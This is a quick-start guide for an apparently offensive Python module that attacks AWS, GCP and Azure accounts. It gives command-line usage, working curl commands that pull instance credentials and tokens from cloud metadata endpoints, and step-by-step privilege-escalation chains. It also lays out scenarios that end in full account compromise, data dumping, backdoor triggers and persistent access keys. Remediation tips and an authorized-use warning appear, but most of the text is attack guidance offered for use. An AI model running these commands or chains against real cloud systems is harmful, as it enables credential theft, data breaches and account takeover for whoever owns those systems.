# mod_cloud_attacks.py - Quick Start Guide

## 30-Second Setup

```bash
# Copy to tools directory
cp mod_cloud_attacks.py ~/tools/

# Test it works (mock mode - no credentials needed)
CLOUD_MOCK_MODE=true python3 ~/tools/mod_cloud_attacks.py all
```

## One-Liners

### Safe Testing (No Real Cloud Access)
```bash
# Test all cloud providers
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all

# Deep AWS testing
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py aws --deep

# GCP quick test
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py gcp --quick

# Save report to file
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all --report findings.txt

# JSON output for automation
CLOUD_MOCK_MODE=true python3 mod_cloud_attacks.py all --json > findings.json
```

### With Real Cloud Credentials

```bash
# AWS with credentials
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... python3 mod_cloud_attacks.py aws --deep

# GCP with credentials
GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/sa.json python3 mod_cloud_attacks.py gcp --deep

# Azure with credentials
AZURE_SUBSCRIPTION_ID=... AZURE_CLIENT_ID=... python3 mod_cloud_attacks.py azure --deep

# All providers
AWS_ACCESS_KEY_ID=... GOOGLE_APPLICATION_CREDENTIALS=... AZURE_SUBSCRIPTION_ID=... \
  python3 mod_cloud_attacks.py all --deep
```

## Common Commands

| Command | What It Does |
|---------|-------------|
| `python3 mod_cloud_attacks.py` | Auto-detect cloud provider, run all attacks |
| `python3 mod_cloud_attacks.py aws` | Test AWS only |
| `python3 mod_cloud_attacks.py gcp` | Test GCP only |
| `python3 mod_cloud_attacks.py azure` | Test Azure only |
| `python3 mod_cloud_attacks.py aws --deep` | Deep AWS testing (50+ techniques) |
| `python3 mod_cloud_attacks.py aws --quick` | Quick AWS testing (top 10 techniques) |
| `python3 mod_cloud_attacks.py all --deep` | Deep test all providers |
| `python3 mod_cloud_attacks.py aws --json` | Output as JSON |
| `python3 mod_cloud_attacks.py aws --report out.txt` | Save report to file |

## Example Outputs

### Critical Findings

```
[AWS] IMDS v1 Accessible via SSRF
Severity: CRITICAL (9.8)
Description: IMDSv1 allows unauthenticated access to instance credentials
PoC: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

[AWS] Lambda Environment Variable Exposure
Severity: CRITICAL (9.8)
Description: Hardcoded secrets in Lambda function environment variables
Evidence: DB_PASSWORD, API_KEY exposed

[GCP] Service Account Token Exposed
Severity: CRITICAL (9.8)
Description: Service account token accessible via metadata server
PoC: curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity

[Azure] Managed Identity Token Exposed
Severity: CRITICAL (9.8)
Description: Managed identity token extractable from IMDS endpoint
PoC: curl -H 'Metadata:true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/
```

### Privilege Escalation Chains

```
Chain 1: AWS EC2-Instance-Role → Administrator (CVSS 9.8)
  Step 1: Create user (iam:CreateUser)
  Step 2: Attach admin policy (iam:AttachUserPolicy)
  Step 3: Assume admin role (sts:AssumeRole)
  Result: Full account compromise

Chain 2: GCP compute-default → customAdmin (CVSS 9.5)
  Step 1: Create service account key (iam.serviceAccountKeys.create)
  Step 2: Create custom admin role (iam.roles.create)
  Step 3: Assign role to service account (resourcemanager.projects.setIamPolicy)
  Result: Project-level admin access

Chain 3: Azure Contributor → Owner (CVSS 9.2)
  Step 1: Create custom RBAC role (Microsoft.Authorization/roleAssignments/write)
  Step 2: Assign role to service principal
  Step 3: Assume elevated identity
  Result: Subscription-level admin access
```

## Attack Vectors at a Glance

### AWS (50+ techniques)
- **IMDS:** v1 unauthenticated access, v2 token extraction
- **S3:** Bucket enumeration, ACL bypass, public access
- **IAM:** Policy enumeration, user creation, role assumption
- **Lambda:** Environment variable extraction, code injection
- **RDS:** Public access exploitation, security group abuse
- **Secrets Manager:** Secret extraction, KMS abuse
- **EC2:** Instance enumeration, credential harvesting

### GCP (30+ techniques)
- **Metadata:** Service account token extraction
- **Cloud Storage:** Bucket enumeration, IAM analysis
- **IAM:** Role enumeration, custom role creation
- **Cloud Functions:** Environment variable extraction, RCE
- **Service Accounts:** Key generation, impersonation

### Azure (25+ techniques)
- **Managed Identity:** Token extraction, scope escalation
- **Key Vault:** Secret enumeration, access control bypass
- **Storage:** Container access, SAS token abuse
- **RBAC:** Role enumeration, privilege escalation
- **Subscriptions:** Resource enumeration, policy abuse

## Mock Mode (For Training)

```bash
# Safe testing without real cloud credentials
export CLOUD_MOCK_MODE=true

# Generates realistic findings without touching real cloud
python3 mod_cloud_attacks.py all

# Output includes:
# - 10+ mock findings per cloud
# - Realistic PoC commands
# - Privilege escalation chains
# - Remediation guidance
# - JSON export
```

## Integration Examples

### With hakuza
```bash
# CLI integration (when integrated into hakuza)
hakuza cloud --provider aws --deep
hakuza cloud --provider gcp --quick
hakuza cloud --provider azure
```

### With Python Code
```python
from mod_cloud_attacks import CloudAttackOrchestrator, CloudProvider

# Initialize
orchestrator = CloudAttackOrchestrator(
    provider=CloudProvider.AWS,
    deep_mode=True
)

# Run attacks
findings = orchestrator.run_aws_attacks()

# Generate report
report = orchestrator.generate_report()
print(report)

# Access findings programmatically
for finding in orchestrator.findings:
    print(f"[{finding.severity.name}] {finding.title}")
```

### With SIEM Export
```bash
# Export to JSON for SIEM ingestion
python3 mod_cloud_attacks.py all --json | \
  jq '.findings[] | {title, severity, provider, curl_poc}' | \
  curl -X POST -d @- https://your-siem.com/api/findings
```

## File Structure

```
mod_cloud_attacks.py          Main module (1455 lines)
├── Cloud Detection
├── AWS Attack Module (50+ techniques)
├── GCP Attack Module (30+ techniques)
├── Azure Attack Module (25+ techniques)
└── Orchestrator & CLI

CLOUD_ATTACKS_GUIDE.md        Complete usage guide (809 lines)
├── Quick start
├── Detailed attack walkthroughs
├── Real-world scenarios
├── Privilege escalation chains
└── Remediation guidance

CLOUD_ATTACKS_TESTING.md      Testing procedures (602 lines)
├── Unit/integration tests
├── Real-world scenarios
├── Validation checklist
├── CI/CD integration
└── Regression testing
```

## Severity Levels

| Severity | CVSS | Impact |
|----------|------|--------|
| CRITICAL | 9.0-10 | Account compromise, data breach, RCE |
| HIGH | 7.0-8.9 | Privilege escalation, unauthorized access |
| MEDIUM | 4.0-6.9 | Information disclosure, configuration abuse |
| LOW | 0.1-3.9 | Minor issues, low impact findings |
| INFO | - | Informational, no security impact |

## Real-World Scenarios

### Scenario: SSRF → IMDS → Admin Access
```
1. Find SSRF in web app: ?url=http://internal
2. Inject IMDS metadata URL
3. Extract EC2 role credentials
4. Enumerate IAM policies
5. Create admin user
6. Generate persistent access key
7. RESULT: Full AWS account compromise
```

### Scenario: Lambda Secrets → Database Access
```
1. List Lambda functions
2. Extract environment variables
3. Find hardcoded DB credentials
4. Access production database
5. Dump sensitive data
6. Create backdoor trigger
7. RESULT: Data theft + persistent access
```

## Key Remediation Actions

### AWS
- Enforce IMDSv2 (HttpTokens=required)
- Block S3 public access globally
- Use Secrets Manager, not hardcoded secrets
- Implement IAM permission boundaries
- Restrict RDS to VPC only
- Enable CloudTrail logging

### GCP
- Disable metadata service if unused
- Use Workload Identity Federation
- Enforce "Private" bucket access level
- Rotate service account keys regularly
- Use custom roles with least privilege
- Enable Cloud Audit Logs

### Azure
- Restrict Managed Identity scope
- Implement Key Vault access policies
- Set Storage to "Private" access level
- Use Azure AD for authentication
- Enforce MFA for all logins
- Enable Azure Policy enforcement

## Performance

| Mode | Time | Memory |
|------|------|--------|
| Quick | <5s | <100MB |
| Deep | 10-30s | <200MB |
| All Deep | <60s | <250MB |

## Limitations

### Not Covered (by design)
- Oracle database SQLi extraction (rare config)
- GraphQL → SQLi pivot (limited surface)
- JWT algorithm case variants (library-specific)
- Python pickle RCE (complex gadget chains)

### Requires Real Credentials
- Actual IMDS exploitation (needs EC2/GCE/Azure VM)
- Real S3 bucket enumeration
- Lambda function invocation
- Database connections

## Security Notes

⚠️ **AUTHORIZED TESTING ONLY**

- Verify you have written permission before testing
- Do not test third-party systems without permission
- Use mock mode for training/demos
- This tool is for security professionals only
- Unauthorized access is illegal

## Quick Troubleshooting

| Issue | Solution |
|-------|----------|
| No credentials found | Use `CLOUD_MOCK_MODE=true` or set env variables |
| IMDS not accessible | Ensure you're on cloud instance (EC2/GCE/Azure VM) |
| Permission denied | Verify IAM role has required permissions |
| Too many API calls | Use `--quick` mode instead of `--deep` |

## Next Steps

1. **Training:** Run with `CLOUD_MOCK_MODE=true`
2. **Lab Testing:** Use test accounts on real clouds
3. **Engagement:** Run against authorized targets
4. **Report:** Use `--report` flag for documentation

---

**For full documentation, see:**
- CLOUD_ATTACKS_GUIDE.md (detailed walkthroughs)
- CLOUD_ATTACKS_TESTING.md (testing procedures)
- DELIVERABLES.md (complete reference)

**Questions?** Review the comprehensive guides or run `python3 mod_cloud_attacks.py --help`
